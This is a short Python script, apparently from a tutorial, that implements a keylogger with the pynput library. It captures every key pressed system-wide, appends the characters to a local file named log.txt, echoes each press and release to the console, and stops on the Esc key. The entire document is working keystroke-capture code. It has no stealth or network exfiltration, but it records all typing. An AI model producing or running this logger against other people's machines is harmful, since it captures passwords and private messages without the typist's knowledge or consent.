import pynput  # pynput module to control all the input devices
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(key)

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def write_file(key):
    with open('log.txt', 'a') as f:  # Open the file in append mode
        # Removing quotes around the key name
        k = str(key).replace("'", "")
        # Special handling for space key
        if k == 'Key.space':
            f.write(' ')
        elif k.find('Key') == -1:
            f.write(k) 
        # Every keystroke for readability 
        f.write(' ')

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
